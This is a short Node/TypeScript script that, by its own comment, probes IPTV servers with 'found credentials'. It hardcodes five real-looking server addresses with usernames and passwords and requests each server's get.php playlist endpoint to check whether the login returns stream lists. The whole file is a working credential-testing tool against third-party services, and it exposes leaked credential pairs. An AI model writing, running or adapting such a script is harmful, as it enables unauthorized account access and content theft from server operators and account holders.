// Probe IPTV servers with found credentials
const https = require('https');
const http = require('http');

const targets = [
  { url: 'http://iptvpro.premium-itv.com:8789', user: 'Aaron', pass: '12345' },
  { url: 'http://190.2.150.61:25461', user: '0320', pass: '0320' },
  { url: 'http://kimbogrupol.com:25461', user: 'Jhonny', pass: 'Jhonny' },
  { url: 'http://gold-iptv.com:8080', user: 'atakan', pass: '1234' },
  { url: 'http://163.172.52.182:8789', user: 'serversportp2', pass: 'PMM106scdO' },
];

async function probeServer(target: { url: string; user: string; pass: string }) {
  const m3uUrl = `${target.url}/get.php?username=${target.user}&password=${target.pass}&type=m3u`;
  
  return new Promise((resolve) => {
    const client = m3uUrl.startsWith('https') ? https : http;
    
    const req = client.get(m3uUrl, { timeout: 10000 }, (res: any) => {
      let data = '';
      res.on('data', (chunk: string) => data += chunk);
      res.on('end', () => {
        const lines = data.split('\n').length;
        const hasContent = data.includes('#EXTINF') || data.includes('http');
        resolve({
          url: target.url,
          user: target.user,
          status: res.statusCode,
          lines,
          hasContent,
          sample: data.substring(0, 500)
        });
      });
    });
    
    req.on('error', (e: Error) => {
      resolve({ url: target.url, user: target.user, error: e.message });
    });
    
    req.on('timeout', () => {
      req.destroy();
      resolve({ url: target.url, user: target.user, error: 'timeout' });
    });
  });
}

async function main() {
  console.log('🔍 PROBING IPTV SERVERS WITH CREDENTIALS...\n');
  console.log('============================================\n');
  
  for (const target of targets) {
    console.log(`📡 Probing: ${target.url}`);
    console.log(`   User: ${target.user} | Pass: ${target.pass}`);
    
    const result = await probeServer(target);
    console.log(`   Result:`, JSON.stringify(result, null, 2).substring(0, 300));
    console.log('');
    
    await new Promise(r => setTimeout(r, 1000));
  }
}

main().catch(console.error);
